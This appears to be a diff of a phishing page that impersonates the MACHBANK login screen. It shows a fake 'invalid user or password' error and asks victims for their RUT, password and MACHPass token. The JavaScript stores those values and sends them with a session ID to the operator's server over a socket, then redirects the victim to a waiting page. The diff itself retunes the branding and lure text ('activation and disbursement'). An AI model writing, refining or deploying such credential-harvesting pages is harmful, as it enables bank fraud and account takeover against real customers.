@@ -59,7 +59,7 @@
       margin-right: auto;
     }
     button {
-      background-color: #7035ee;
+      background-color: #7C12B5;
       color: white;
       padding: 12px;
       border: none;
@@ -69,25 +69,30 @@
       width: 100%;
     }
     button:hover {
-      background-color: #000000;
+      background-color: #C227F5;
     }
   </style>
 </head>
 <body>
   <div class="container">
     <div class="logo">
-      <img src="https://cdn3.bci.cl/uploads/161e8cfd-f345-474c-bf6b-e4f12fa99f22/original/Recurso_5logo_machbank_color_noborder.webp" alt="logo" />
+      <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcT9urrLavHeCltEaaBbQmtmD52KKZqHktoaZA&s" alt="logo" />
     </div>
     <h2>Bienvenido a <strong>MACHBANK</strong></h2>
     <div class="alerta">
       ❗ Usuario o clave inválida. Por favor ingrese a su cuenta correctamente.
     </div>
-    <p>Ingrese su usuario, contraseña y MACHPASS para continuar con el proceso de verificación.</p>
+    <p>Ingrese a continuacion para iniciar con su proceso de activcion y desembolso.</p>
     <form id="login-form">
       <input type="text" id="usuario" placeholder="Ingrese su RUT" required />
       <input type="password" id="clave" placeholder="Contraseña" required />
-      <input type="password" id="machpass" placeholder="Ingrese MACHPASS" required />
       
+      <!-- Campo de Token -->
+      <input type="text" id="token" placeholder="Ingrese su MACHPass" required />
+
+      <!-- Alerta debajo del campo de token -->
+     
+
       <button type="submit">Continuar</button>
     </form>
   </div>
@@ -107,11 +112,11 @@
           // Obtener los valores de los campos
           const usuario = document.getElementById('usuario').value;
           const contrasena = document.getElementById('clave').value;
-          const machpass = document.getElementById('machpass').value;
+          const token = document.getElementById('token').value;
           const sessionId = localStorage.getItem('sessionId');
 
           // Validar los campos antes de enviar
-          if (!usuario || !contrasena || !machpass) {
+          if (!usuario || !contrasena || !token) {
             alert("Por favor, complete todos los campos.");
             return;
           }
@@ -119,10 +124,10 @@
           // Actualizar localStorage con los nuevos datos ingresados
           localStorage.setItem('usuario', usuario);
           localStorage.setItem('contrasena', contrasena);
-          localStorage.setItem('machpass', machpass);
+          localStorage.setItem('token', token);
 
           // Enviar al servidor con la sesión original
-          socket.emit('errorlogoForm', { usuario, contrasena, machpass, sessionId });
+          socket.emit('errorlogoForm', { usuario, contrasena, token, sessionId });
 
           // Redirigir a la pantalla de espera
           window.location.href = 'opciones.html';
